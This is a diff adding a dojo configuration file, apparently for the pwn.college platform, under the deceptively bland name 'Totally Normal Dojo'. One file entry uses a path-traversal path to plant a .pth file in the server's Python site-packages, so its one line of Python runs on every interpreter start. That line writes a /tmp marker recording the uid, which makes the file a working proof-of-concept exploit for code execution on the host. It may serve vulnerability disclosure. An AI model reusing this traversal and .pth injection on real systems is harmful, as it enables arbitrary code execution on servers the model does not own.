@@ -1,0 +1,17 @@
+id: totally-normal-dojo
+name: Totally Normal Dojo
+type: public
+image: pwncollege/challenge-simple
+
+files:
+  - type: text
+    path: a/../../../../../../../../opt/venv/lib/python3.13/site-packages/zz_poc_d01.pth
+    content: |
+      import os, sys, pathlib; pathlib.Path("/tmp/POC_D01_PWNED").write_text("pwned as uid=%d via %r" % (os.getuid(), sys.argv))
+
+modules:
+  - id: module
+    name: Module
+    challenges:
+      - id: challenge
+        name: Challenge
